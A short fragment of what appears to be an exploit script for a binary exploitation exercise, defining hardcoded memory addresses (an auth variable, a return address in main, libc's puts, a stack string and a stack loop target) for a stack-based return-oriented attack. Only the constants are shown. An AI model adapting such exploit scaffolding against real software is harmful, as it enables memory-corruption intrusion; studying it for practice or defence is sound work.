...
AUTH = 0x804a054
# Also used
# address in the main right after calling check_address
RET_MAIN = 0x080488b0
...
PUTS = 0xb7b7a460
# Also used:
# address of the string "Take me ..." on my stack
STRING = 0xbfffe058
# address in the stack we'll return to in the end of each interation
LOOP = 0xbfffe044
